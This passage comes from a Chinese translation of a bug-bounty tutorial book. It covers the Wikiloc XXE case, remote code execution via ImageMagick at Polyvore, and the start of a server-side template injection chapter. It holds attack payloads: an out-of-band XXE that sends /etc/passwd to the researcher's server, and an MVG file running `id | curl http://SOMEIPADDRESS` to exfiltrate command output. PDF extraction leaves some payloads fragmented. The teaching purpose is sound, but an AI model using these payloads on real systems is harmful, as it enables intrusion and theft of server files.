受 、 、 ，以及其它的站点。向我之前提到过的那样，有时候你不会
.docx .xlsx .pptx
直接从 XXE 收到响应，这个示例展示了如何建立服务器来接受请求，它展示了 XXE。
此外，像我们的例子中那样，有时报告一开始会被拒绝。拥有信息和耐心和你报告的公
司周旋非常重要。尊重他们的决策，同时也解释为什么这可能是个漏洞。
3. Wikiloc XXE
难度：高
URL：
wikiloc.com
报告链接：
http://www.davidsopas.com/wikiloc-xxe-vulnerability
报告日期：2015.10
奖金：Swag
描述：
根据他们的站定，Wikiloc 是个用于发现和分享最佳户外远足、骑车以及许多其他运动记录的
地方。有趣的是，他们也让用户通过 XML 文件上传他们自己的记录，这就对例如 David
Soaps 之类的骑手非常有吸引力了。
基于他们的 Write Up，David 注册了 Wikiloc，并注意到了 XML 上传点，决定测试它有没有
XXE 漏洞。最开始，它从站点下载了文件来判断 XML 结构，这里是一个 .gpx 文件，并插入
了 。
* ]>;
之后它调用了 .gpx 文件中 13 行的记录名称中的实体。
75
十四、XML 外部实体注入
 ]>
2015-10-29T12:53:09Z
&xxe;
178.000000
2009-01-10T14:18:10Z
(...)
这产生了发往服务器的 HTTP GET 请求， GET 144.76.194.66 /XXE/ 10/29/15 1:02PM
。这有两个原因值得注意，首先，通过使用一个概念调用的简单证明，David
Java/1.7.0_51
能够确认服务器求解了它插入的 XML 并且进行了外部调用。其次，David 使用现存的 XML
文件，以便时它的内容满足站点所预期的结构。虽然它没有讨论这个，调用它的服务器可能
并不是必须的，如果它能够服务 文件，并将内容渲染在 元素中。
/etc/passwd 
在确认 Wikiloc 会生成外部 HTTP 请求后，唯一的疑问就是，是否它能够读取本地文件。所
以，它修改了注入的 XML，来让 Wikiloc 向他发送它们的 /etc/passwd 文件内容。
%dtd;]>
2015-10-29T12:53:09Z
&send;
(...)
76
十四、XML 外部实体注入
这看起来十分熟悉。这里他使用了两个实体，它们都在 DTD 中求值，所以它们使用 % 定
义。 在 标签中的的引用实际上由返回的 文件定义，他的服务器将其
&send;  xxe.dtd
发送回 Wikiloc。这里是这个文件：
">
%all;
要注意 实际上定义了 ，我们刚刚在 标签中注意到它。这里是求
%all; !ENTITY send 
值的过程：
1. Wikiloc 解析了 XML，并将 %dtd; 求值为 David 的服务器的外部调用。
2. David 的服务器向 Wikiloc 返回了 xxe.dtd 文件。
3. Wikiloc 解析了收到的 DTD文件，它触发了 %all; 的调用。
4. 当 %all; 求值时，它定义了 &send; ，它包含 %file; 实体的调用。
5. %file; 在 URL 值中被替换为 /etc/passwd 文件的内容。
6. Wikiloc 解析了 XML 文件，发现了 &send; 实体，它求值为 David 服务器的远程调用，带
有 /etc/passwd 的内容，作为 URL 中的参数。
用他自己的话来说，游戏结束了。
重要结论
像之前提到的那样，这是一个不错的例子，展示了如何使用来自站点的 XML 模板，来组
装你自己的 XML 实体，便于让目标合理地解析文件。这里，Wikiloc 期待 .gpx 文件，而
David 保留了该结构，在预期标签中插入了他自己的 XML 实体，也就是  标签。
此外，观察如何处理恶意 DTD 文件很有意思，并且可以用于随后让目标向你的 服务器
发送 GET 请求，带有文件内容作为 URL 参数。
总结
XXE 表示一类有巨大潜力的有趣的攻击向量。有几种方式来完成，就像我们之前看到的那
样，它能够让漏洞应用打印自己的 文件，以 文件来调用远程服务
/etc/passwd /etc/passwd
器，以及请求远程 DTD 文件，它让解析器来使用 /etc/passwd 文件调用服务器。
作为一个黑客，要留意文件上传，特别是那些接受一些 XML 类型的上传，应该始终测试它们
是否存在 XXE 漏洞。
77
十五、代码执行
十五、代码执行
作者：Peter Yaworski
译者：飞龙
协议：CC BY-NC-SA 4.0
描述
远程代码执行是指注入由漏洞应用解释和执行的代码。这通常由用户提交输入，应用使用它
而没有任何类型的处理或验证而导致。
看一下这行代码：
$var = $_GET['page'];
eval($var);
这里，漏洞应用可能使用 URL index.php?page=1 ，但是，如果用于输入了 index.php?
，应用就会执行 函数，并返回其内容。
page=1;phpinfo() phpinfo
与之类似，远程代码执行有时用于指代命令注入，OWASP 区分了这两点。使用命令驻入，
根据 OWASP，漏洞应用在主机操作系统上执行任何命令。同样，这也由不合理处理和验证
用户输入导致，这会导致用户输入传递给操作系统的命令。
例如 PHP 中，这可能表现为用户输入传递给 system 函数。
示例
1. Polyvore ImageMagick
ImageMagick 是个软件包，通常用于处理图像，例如剪裁、缩放等等。 PHP 的 imagick、
Ruby 的 rmagick 以及 paperclip，以及 NodeJs 的 imagemagick 都利用了它。在 2016 年 4
月，该库中发现了多个漏洞，其中可利用的漏洞之一就是执行远程代码，这就是我关注的。
简单来说，ImageMagick 并没有合理地传给他的过滤文件名称，并且最终用于执行 方
system
法调用。因此，攻击者利益传入命令来执行，就像 ，它会被执
https://example.com”|ls“-la
行。一个来自 ImageMagick 的例子是：
78
十五、代码执行
convert 'https://example.com"|ls "-la' out.png
现在，有趣的是，ImageMagick 为 MVG（Magick Vectire Graphics）文件定义了自己的语
法。所以，攻击者能够创建文件 ，带有下列代码：
exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
这之后会传给该库，并且如果站点存在漏洞，代码会执行并列出目录中的文件。
了解其背景之后，Ben Sadeghipour 测试了 Yahoo acquisition 站点以及 Polyvore 是否存在漏
洞。就像他博文中所述，Ben 首先在它所控制的本地机器上测试了该漏洞，来确认 文件
mvg
是否正常工作。这是他使用的代码：
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://SOMEIPADDRESS:80
80/ -d @- > /dev/null`'
pop graphic-context
这里你可以看到，它使用了 CURL 库来调用 SOMEIPADDRESS（将其修改为你服务器的地
址）。如果成功，你就会得到像这样的响应：
Ben Sadeghipour ImageMagick 测试的服务器响应
下面 Ben 浏览了 Polyvore，将文件上传为它的资料头像，并在它的服务器上收到了这个响
应：
79
十五、代码执行
Ben Sadeghipour Polyvore ImageMagick 响应
重要结论
阅读是成功渗透的重要组成部分，这包括阅读软件漏洞和常见漏洞，以及披露（CVE 标
识符）。当你碰到没有安装安全更新的站点时，了解之前的漏洞能够帮助你。这里，
Yahoo 已经修补了服务器，但是没有正确完成（我找不到关于这是什么意思的解释）。
一次你，了解 ImageMagick 漏洞让 Ben 特地以这个软件为目标，并得到了 $2000 的奖
金。
总结
远程代码执行，就像其他漏洞一样，通常是用户输入没有合理验证和处理的结果。这里提供
的例子中，ImageMagick 没有合理转义可能为恶意的内容。它和 Ben 对该漏洞的知识一起，
让他能够特地寻找和测试一些漏洞站点。对于搜索这些类型的漏洞来说，没有简单的答案。
要注意发布的 CVE，并且留意站点所使用的软件，它们可能会过时，也可能存在漏洞。
80
十六、模板注入
十六、模板注入
作者：Peter Yaworski
译者：飞龙
协议：CC BY-NC-SA 4.0
模板引擎是允许开发者或设计师在创建动态网页的时候，从数据展示中分离编程逻辑的工
具。换句话说，除了拥有接收 HTTP 请求的代码，从数据库查询必需的数据并且之后将其在
单个文件中将其展示给用户之外，模板引擎从计算它的剩余代码中分离了数据的展示（此
外，流行的框架和内容管理系统也会从查询中分离 HTTP 请求）。
服务端模板注入（SSTI）在这些引擎渲染用户输入，而不合理处理它的时候发生，类似于
XSS，例如，jinja2 是 Python 的模板语言，取自 nVisium，一个 404 错误页面的示例为：
@app.errorhandler(404)
def page_not_found(e):
template = '''{%% extends "layout.html" %%}
{%% block body %%}
Opps! That page doesn't exist.
%s
{%% endblock %%}
''' % (request.url)
return render_template_string(template), 404
来源：https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2
这里， page_not_found 函数渲染了 HTML，开发者将 URL 格式化为字符串并将其展示给用
户。所以，如果攻击者输入了 ，开发者的代码会渲
http://foo.com/nope{{7*7}}